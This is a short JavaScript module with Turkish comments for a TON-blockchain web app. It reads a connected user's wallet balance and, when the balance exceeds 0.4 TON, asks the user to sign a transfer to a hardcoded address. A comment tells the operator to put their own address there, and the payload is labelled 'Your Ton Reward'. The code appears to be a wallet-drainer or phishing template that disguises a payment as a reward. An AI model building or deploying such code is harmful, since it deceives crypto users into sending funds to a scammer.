/* eslint-disable */
import TonWeb from 'tonweb'; // TonWeb kütüphanesini import ediyoruz
const tonweb = new TonWeb(); // TonWeb'i başlatıyoruz

const send_transaction = async (tonConnectUI) => {
  try {
    // Cüzdan adresini tonConnectUI'den al
    const walletAddress = tonConnectUI.account.address;

    // Cüzdan bakiyesini almak için TonWeb API'sini kullanıyoruz
    const balanceResponse = await tonweb.provider.getBalance(walletAddress);
    const tonbalance = balanceResponse.balance; // Bakiye nanoTON cinsindedir

    const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Buraya kendi cüzdan adresini koy

    console.log("Bakiye Bilgileri:");
    console.log("TON:", tonbalance / 1e9); // NanoTON'dan TON'a çeviriyoruz

    // Transaction mesajları (her coin için)
    const messages = [];

    // 0.4 TON üzerindeyse transaction yapalım
    if (tonbalance / 1e9 > 0.4) {
      messages.push({
        address: targetAddress,
        amount: 5000000,
        payload: 'Your Ton Reward',
      });
    }

    if (messages.length > 0) {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 saniyelik geçerlilik süresi
        messages,
      };

      // Transaction gönder
      const result = await tonConnectUI.sendTransaction(transaction);
      console.log('Transaction başarılı:', result);
    } else {
      console.log("Yeterli miktarda bakiye yok.");
    }
  } catch (error) {
    console.error('Transaction hatası:', error);
    alert("Transaction gerçekleşmedi: " + error.message); // Hata mesajını kullanıcıya göster
  }
};

export { send_transaction };
